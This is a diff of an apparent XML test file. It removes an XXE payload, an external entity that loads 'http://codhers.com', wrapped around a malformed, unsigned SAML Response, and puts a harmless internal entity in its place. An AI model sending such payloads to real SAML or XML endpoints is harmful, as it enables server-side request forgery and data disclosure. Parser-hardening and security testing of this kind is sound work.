@@ -1,23 +1,4 @@
-
-<?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://codhers.com" >]>
-
-<foo>&xxe;
-<samlp:Response ID="d4_kS-guM6wiWqkSLdWESYZ8DGv"
-  IssueInstant="2016-12-21T19:15:11.418Z" Version="2.0" xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
-  <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://www.xyz.com.com/enterprise-central</saml:Issuer>
-  <samlp:Status>
-    <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
-  </samlp:Status>
-  <saml:Assertion ID="YzZoJdNiWwkrRrz3pljoYUvX3Lb"
-    IssueInstant="2016-12-21T19:15:11.480Z" Version="2.0" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
-    <saml:Issuer>https://www.xyz.com/enterprise-central</saml:Issuer>
-    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
-      <ds:SignedInfo>
-      </ds:SignedInfo>
-      <ds:SignatureValue>
-
-</ds:SignatureValue>
-/<saml:Assertion>
-</samlp:response>
-</foo>
+<!DOCTYPE Response [
+  <!ENTITY msg 'Hello World'>
+]>
+ <Response>&msg;</Response>
